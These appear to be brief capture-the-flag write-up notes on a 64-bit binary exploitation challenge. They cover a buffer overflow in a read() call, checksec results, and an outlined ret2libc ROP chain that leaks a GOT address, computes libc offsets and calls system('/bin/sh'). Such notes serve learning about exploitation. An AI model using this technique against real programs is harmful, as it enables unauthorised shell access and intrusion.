**Read source code**
- `read(0, buf, 0x400);`: bufferoverflow => ROP
- Stack
```
buf (rbp - 0x40)
rdi -> 1
rsi -> read_got
r15 -> 0
write_plt
main
---
rdi -> binsh
system
```
- `Checksec` in gdb
```
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
RUNPATH:    b'.'
Stripped:   No
```
- So the idea is that use gadget to change the execution flow of a program without injecting new code.
---  
***EPLOIT***
```
write(1, read_got,)
main
system("/bin/sh")
```
- Get address of read_got by `write(1, read_got,)`
- Calculate `libc_base = read - read_offset`
- Calculate `system = libc_base + system_offset`
- Calculate `binsh = libc_base + binsh_offset`
- Return to main then ret `system("/bin/sh")`
